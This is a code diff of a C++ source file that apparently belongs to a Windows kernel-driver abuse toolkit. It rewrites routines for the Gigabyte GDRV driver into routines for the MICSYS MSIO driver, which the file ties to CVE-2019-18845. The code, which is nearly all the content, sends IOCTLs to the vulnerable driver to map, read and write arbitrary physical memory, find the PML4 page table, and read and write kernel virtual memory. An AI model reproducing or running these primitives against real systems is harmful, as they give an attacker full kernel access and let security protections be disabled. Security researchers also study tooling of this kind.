@@ -2,13 +2,13 @@
 *
 *  (C) COPYRIGHT AUTHORS, 2020
 *
-*  TITLE:       GDRV.CPP
+*  TITLE:       MSIO.CPP
 *
 *  VERSION:     1.00
 *
 *  DATE:        07 Feb 2020
 *
-*  Gigabyte GiveIO GDRV driver routines.
+*  MICSYS MSIO driver routines.
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -18,21 +18,21 @@
 *******************************************************************************/
 
 #include "global.h"
-#include "idrv/gdrv.h"
+#include "idrv/msio.h"
 
 //
-// Gigabyte driver based on MAPMEM.SYS Microsoft Windows NT 3.51 DDK example from 1993.
+// MICSYS RGB driver interface for CVE-2019-18845.
 //
 
 /*
-* GioCallDriver
+* MsioCallDriver
 *
 * Purpose:
 *
-* Call Gigabyte Gdrv driver.
+* Call Patriot Msio driver.
 *
 */
-BOOL GioCallDriver(
+BOOL MsioCallDriver(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG IoControlCode,
     _In_ PVOID InputBuffer,
@@ -60,129 +60,100 @@ BOOL GioCallDriver(
 }
 
 /*
-* GioMapMemory
+* MsioMapMemory
 *
 * Purpose:
 *
 * Map physical memory through \Device\PhysicalMemory.
 *
 */
-PVOID GioMapMemory(
+PVOID MsioMapMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR PhysicalAddress,
-    _In_ ULONG NumberOfBytes)
+    _In_ ULONG NumberOfBytes,
+    _Out_ HANDLE *SectionHandle,
+    _Out_ PVOID *ReferencedObject)
 {
-    PVOID pMapSection = NULL;
-    GDRV_PHYSICAL_MEMORY_INFO request;
+    MSIO_PHYSICAL_MEMORY_INFO request;
+
+    *SectionHandle = NULL;
+    *ReferencedObject = NULL;
 
     RtlSecureZeroMemory(&request, sizeof(request));
-    request.BusAddress.QuadPart = PhysicalAddress;
-    request.Length = NumberOfBytes;
-
-    if (GioCallDriver(DeviceHandle,
-        IOCTL_GDRV_MAP_USER_PHYSICAL_MEMORY,
+    request.ViewSize = PhysicalAddress + NumberOfBytes;
+    
+    if (MsioCallDriver(DeviceHandle,
+        IOCTL_MSIO_MAP_USER_PHYSICAL_MEMORY,
         &request,
         sizeof(request),
-        (PVOID)&pMapSection,
-        sizeof(PVOID)))
+        &request,
+        sizeof(request)))
     {
-        return pMapSection;
+        *SectionHandle = request.SectionHandle;
+        *ReferencedObject = request.ReferencedObject;
+        return request.BaseAddress;
     }
 
     return NULL;
 }
 
 /*
-* GioUnmapMemory
+* MsioUnmapMemory
 *
 * Purpose:
 *
 * Unmap previously mapped physical memory.
 *
 */
-VOID GioUnmapMemory(
+VOID MsioUnmapMemory(
     _In_ HANDLE DeviceHandle,
-    _In_ PVOID SectionToUnmap
+    _In_ PVOID SectionToUnmap,
+    _In_ HANDLE SectionHandle,
+    _In_ PVOID ReferencedObject
 )
 {
-    GioCallDriver(DeviceHandle,
-        IOCTL_GDRV_UNMAP_USER_PHYSICAL_MEMORY,
-        &SectionToUnmap,
-        sizeof(PVOID),
-        NULL,
-        0);
-}
+    MSIO_PHYSICAL_MEMORY_INFO request;
 
-/*
-* GioVirtualToPhysicalEx
-*
-* Purpose:
-*
-* Translate virtual address to the physical.
-*
-* WARNING:
-* RED ALERT, GDRV always(!) truncates physical address to 4 bytes. DO NOT USE.
-*
-*/
-BOOL WINAPI GioVirtualToPhysicalEx(
-    _In_ HANDLE DeviceHandle,
-    _In_ ULONG_PTR VirtualAddress,
-    _Out_ ULONG_PTR* PhysicalAddress)
-{
-    BOOL bResult = FALSE;
-    DWORD dwError = ERROR_SUCCESS;
-    GIO_VIRTUAL_TO_PHYSICAL request;
+    RtlSecureZeroMemory(&request, sizeof(request));
+    request.BaseAddress = SectionToUnmap;
+    request.ReferencedObject = ReferencedObject;
+    request.SectionHandle = SectionHandle;
 
-    if (PhysicalAddress)
-        *PhysicalAddress = 0;
-    else {
-        SetLastError(ERROR_INVALID_PARAMETER);
-        return FALSE;
-    }
-
-    request.Address.QuadPart = VirtualAddress;
-
-    if (GioCallDriver(DeviceHandle,
-        IOCTL_GDRV_VIRTUALTOPHYSICAL,
+    MsioCallDriver(DeviceHandle,
+        IOCTL_MSIO_UNMAP_USER_PHYSICAL_MEMORY,
         &request,
         sizeof(request),
         &request,
-        sizeof(request)))
-    {
-        *PhysicalAddress = request.Address.LowPart;
-        bResult = TRUE;
-    }
-    else {
-        dwError = GetLastError();
-    }
-
-    SetLastError(dwError);
-    return bResult;
+        sizeof(request));
 }
 
 /*
-* GioQueryPML4Value
+* MsioQueryPML4Value
 *
 * Purpose:
 *
 * Locate PML4.
 *
 */
-BOOL WINAPI GioQueryPML4Value(
+BOOL WINAPI MsioQueryPML4Value(
     _In_ HANDLE DeviceHandle,
     _Out_ ULONG_PTR* Value)
 {
     DWORD dwError = ERROR_SUCCESS;
-    ULONG_PTR pbLowStub1M = NULL, PML4 = 0;
+    ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;
 
+    PVOID refObject = NULL;
+    HANDLE sectionHandle = NULL;
 
     *Value = 0;
 
     do {
 
-        pbLowStub1M = (ULONG_PTR)GioMapMemory(DeviceHandle,
+        pbLowStub1M = (ULONG_PTR)MsioMapMemory(DeviceHandle,
             0ULL,
-            0x100000);
+            0x100000,
+            &sectionHandle,
+            &refObject);
 
         if (pbLowStub1M == 0) {
             dwError = GetLastError();
@@ -195,7 +166,11 @@ BOOL WINAPI GioQueryPML4Value(
         else
             *Value = 0;
 
-        GioUnmapMemory(DeviceHandle, (PVOID)pbLowStub1M);
+        MsioUnmapMemory(DeviceHandle, 
+            (PVOID)pbLowStub1M, 
+            sectionHandle, 
+            refObject);
+
         dwError = ERROR_SUCCESS;
 
     } while (FALSE);
@@ -205,14 +180,126 @@ BOOL WINAPI GioQueryPML4Value(
 }
 
 /*
-* GioVirtualToPhysical
+* MsioReadWritePhysicalMemory
+*
+* Purpose:
+*
+* Read/Write physical memory.
+*
+*/
+BOOL WINAPI MsioReadWritePhysicalMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR PhysicalAddress,
+    _In_ PVOID Buffer,
+    _In_ ULONG NumberOfBytes,
+    _In_ BOOLEAN DoWrite)
+{
+    BOOL bResult = FALSE;
+    DWORD dwError = ERROR_SUCCESS;
+    PVOID mappedSection = NULL;
+    ULONG_PTR offset;
+
+    PVOID refObject = NULL;
+    HANDLE sectionHandle = NULL;
+
+    //
+    // Map physical memory section.
+    //
+    mappedSection = MsioMapMemory(DeviceHandle,
+        PhysicalAddress,
+        NumberOfBytes,
+        &sectionHandle,
+        &refObject);
+
+    if (mappedSection) {
+
+        offset = PhysicalAddress;
+
+        __try {
+
+            if (DoWrite) {
+                RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
+            }
+            else {
+                RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
+            }
+
+            bResult = TRUE;
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER)
+        {
+            SetLastError(GetExceptionCode());
+            bResult = FALSE;
+        }
+
+        //
+        // Unmap physical memory section.
+        //
+        MsioUnmapMemory(DeviceHandle,
+            mappedSection,
+            sectionHandle,
+            refObject);
+        
+    }
+    else {
+        dwError = GetLastError();
+    }
+
+    SetLastError(dwError);
+    return bResult;
+}
+
+/*
+* MsioReadPhysicalMemory
+*
+* Purpose:
+*
+* Read from physical memory.
+*
+*/
+BOOL WINAPI MsioReadPhysicalMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR PhysicalAddress,
+    _In_ PVOID Buffer,
+    _In_ ULONG NumberOfBytes)
+{
+    return MsioReadWritePhysicalMemory(DeviceHandle,
+        PhysicalAddress,
+        Buffer,
+        NumberOfBytes,
+        FALSE);
+}
+
+/*
+* MsioWritePhysicalMemory
+*
+* Purpose:
+*
+* Write to physical memory.
+*
+*/
+BOOL WINAPI MsioWritePhysicalMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR PhysicalAddress,
+    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
+    _In_ ULONG NumberOfBytes)
+{
+    return MsioReadWritePhysicalMemory(DeviceHandle,
+        PhysicalAddress,
+        Buffer,
+        NumberOfBytes,
+        TRUE);
+}
+
+/*
+* MsioVirtualToPhysical
 *
 * Purpose:
 *
 * Translate virtual address to the physical.
 *
 */
-BOOL WINAPI GioVirtualToPhysical(
+BOOL WINAPI MsioVirtualToPhysical(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR VirtualAddress,
     _Out_ ULONG_PTR* PhysicalAddress)
@@ -227,8 +314,8 @@ BOOL WINAPI GioVirtualToPhysical(
     }
 
     bResult = PwVirtualToPhysical(DeviceHandle,
-        (provQueryPML4)GioQueryPML4Value,
-        (provReadPhysicalMemory)GioReadPhysicalMemory,
+        (provQueryPML4)MsioQueryPML4Value,
+        (provReadPhysicalMemory)MsioReadPhysicalMemory,
         VirtualAddress,
         PhysicalAddress);
 
@@ -236,115 +323,14 @@ BOOL WINAPI GioVirtualToPhysical(
 }
 
 /*
-* GioReadWritePhysicalMemory
+* MsioReadKernelVirtualMemory
 *
 * Purpose:
 *
-* Read/Write physical memory.
+* Read virtual memory via MSIO.
 *
 */
-BOOL WINAPI GioReadWritePhysicalMemory(
-    _In_ HANDLE DeviceHandle,
-    _In_ ULONG_PTR PhysicalAddress,
-    _In_ PVOID Buffer,
-    _In_ ULONG NumberOfBytes,
-    _In_ BOOLEAN DoWrite)
-{
-    BOOL bResult = FALSE;
-    DWORD dwError = ERROR_SUCCESS;
-    PVOID mappedSection = NULL;
-
-    //
-    // Map physical memory section.
-    //
-    mappedSection = GioMapMemory(DeviceHandle,
-        PhysicalAddress,
-        NumberOfBytes);
-
-    if (mappedSection) {
-
-        __try {
-
-            if (DoWrite) {
-                RtlCopyMemory(mappedSection, Buffer, NumberOfBytes);
-            }
-            else {
-                RtlCopyMemory(Buffer, mappedSection, NumberOfBytes);
-            }
-
-            bResult = TRUE;
-        }
-        __except (EXCEPTION_EXECUTE_HANDLER) {
-            bResult = FALSE;
-            SetLastError(GetExceptionCode());
-        }
-
-        //
-        // Unmap physical memory section.
-        //
-        GioUnmapMemory(DeviceHandle,
-            mappedSection);
-
-    }
-    else {
-        dwError = GetLastError();
-    }
-
-    SetLastError(dwError);
-    return bResult;
-}
-
-/*
-* GioReadPhysicalMemory
-*
-* Purpose:
-*
-* Read from physical memory.
-*
-*/
-BOOL WINAPI GioReadPhysicalMemory(
-    _In_ HANDLE DeviceHandle,
-    _In_ ULONG_PTR PhysicalAddress,
-    _In_ PVOID Buffer,
-    _In_ ULONG NumberOfBytes)
-{
-    return GioReadWritePhysicalMemory(DeviceHandle,
-        PhysicalAddress,
-        Buffer,
-        NumberOfBytes,
-        FALSE);
-}
-
-/*
-* GioWritePhysicalMemory
-*
-* Purpose:
-*
-* Write to physical memory.
-*
-*/
-BOOL WINAPI GioWritePhysicalMemory(
-    _In_ HANDLE DeviceHandle,
-    _In_ ULONG_PTR PhysicalAddress,
-    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
-    _In_ ULONG NumberOfBytes)
-{
-    return GioReadWritePhysicalMemory(DeviceHandle,
-        PhysicalAddress,
-        Buffer,
-        NumberOfBytes,
-        TRUE);
-}
-
-/*
-* GioWriteKernelVirtualMemory
-*
-* Purpose:
-*
-* Write virtual memory via GDRV.
-*
-*/
-BOOL WINAPI GioWriteKernelVirtualMemory(
+BOOL WINAPI MsioReadKernelVirtualMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR Address,
     _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
@@ -354,17 +340,17 @@ BOOL WINAPI GioWriteKernelVirtualMemory(
     ULONG_PTR physicalAddress = 0;
     DWORD dwError = ERROR_SUCCESS;
 
-    bResult = GioVirtualToPhysical(DeviceHandle,
+    bResult = MsioVirtualToPhysical(DeviceHandle,
         Address,
         &physicalAddress);
 
     if (bResult) {
 
-        bResult = GioReadWritePhysicalMemory(DeviceHandle,
+        bResult = MsioReadWritePhysicalMemory(DeviceHandle,
             physicalAddress,
             Buffer,
             NumberOfBytes,
-            TRUE);
+            FALSE);
 
         if (!bResult)
             dwError = GetLastError();
@@ -379,14 +365,14 @@ BOOL WINAPI GioWriteKernelVirtualMemory(
 }
 
 /*
-* GioReadKernelVirtualMemory
+* MsioWriteKernelVirtualMemory
 *
 * Purpose:
 *
-* Read virtual memory via GDRV.
+* Write virtual memory via MSIO.
 *
 */
-BOOL WINAPI GioReadKernelVirtualMemory(
+BOOL WINAPI MsioWriteKernelVirtualMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR Address,
     _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
@@ -396,17 +382,17 @@ BOOL WINAPI GioReadKernelVirtualMemory(
     ULONG_PTR physicalAddress = 0;
     DWORD dwError = ERROR_SUCCESS;
 
-    bResult = GioVirtualToPhysical(DeviceHandle,
+    bResult = MsioVirtualToPhysical(DeviceHandle,
         Address,
         &physicalAddress);
 
     if (bResult) {
 
-        bResult = GioReadWritePhysicalMemory(DeviceHandle,
+        bResult = MsioReadWritePhysicalMemory(DeviceHandle,
             physicalAddress,
             Buffer,
             NumberOfBytes,
-            FALSE);
+            TRUE);
 
         if (!bResult)
             dwError = GetLastError();
